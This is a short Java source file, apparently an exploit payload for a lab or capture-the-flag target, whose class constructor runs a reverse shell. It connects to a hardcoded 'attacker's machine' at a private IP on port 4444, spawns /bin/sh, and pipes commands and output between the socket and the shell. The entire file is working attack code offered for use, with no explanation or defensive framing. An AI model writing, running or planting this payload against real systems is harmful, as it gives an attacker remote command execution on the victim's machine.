// Rename to Exploit.java

import java.io.*;
import java.net.*;

public class Exploit {
    public Exploit() throws Exception {
        // YOUR CODE GOES HERE
        main0(null);
    }
    
    public static void main0(String[] args) throws Exception {
        String ip = "10.10.10.61"; // IP address of the attacker's machine
        int port = 4444; // Port on which the attacker's machine is listening

        Socket socket = new Socket(ip, port);
        InputStream socketInput = socket.getInputStream();
        OutputStream socketOutput = socket.getOutputStream();

        Process process = Runtime.getRuntime().exec("/bin/sh");
        InputStream processInput = process.getInputStream();
        OutputStream processOutput = process.getOutputStream();

        //socketOutput.write(">>> ".getBytes());

        // Forwarding commands from the attacker to the shell
        while (true) {
            // read from socket
            while (socketInput.available() != 0) {
                processOutput.write(socketInput.read());
                processOutput.flush();
            }

            //socketOutput.write(">>> ".getBytes())
            while (processInput.available() != 0) {
                socketOutput.write(processInput.read());
                socketOutput.flush();
            }

            // dont busy loop
            Thread.sleep(1);
        }
    }
}
